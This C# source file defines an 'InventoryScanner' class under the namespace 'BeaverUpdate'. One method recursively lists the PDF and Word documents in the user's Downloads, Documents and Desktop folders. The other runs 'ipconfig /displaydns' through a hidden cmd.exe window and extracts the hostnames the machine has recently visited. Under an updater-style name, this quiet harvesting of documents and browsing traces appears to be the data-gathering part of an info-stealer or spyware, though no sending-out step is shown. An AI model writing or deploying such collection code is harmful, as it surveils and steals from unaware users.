using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace BeaverUpdate
{
    public class InventoryScanner
    {
        private readonly string[] SupportedFileExtensions = { ".pdf", ".doc", ".docx" };
        private readonly string[] UserFolders = { "Downloads", "Documents", "Desktop" };

        public List<string> FileScan()
        {
            var filesList = new List<string>();
            foreach (var folder in UserFolders)
            {
                var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), folder);
                if (Directory.Exists(path))
                {
                    filesList.AddRange(Directory.GetFiles(path, "*.*", SearchOption.AllDirectories).Where(f => SupportedFileExtensions.Contains(Path.GetExtension(f).ToLower())));
                }
            }

            return filesList;
        }

        public List<string> DNSScan()
        {
            var dnsCache = new HashSet<string>();
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c ipconfig /displaydns";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                var lines = output.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
                foreach (var line in lines)
                {
                    if (line.Contains("Name") && !line.Contains("Record Name"))
                    {
                        dnsCache.Add(line.Trim().Split(':')[1].Trim());
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error scanning DNS cache: {ex.Message}");
            }

            return dnsCache.ToList();
        }
    }
}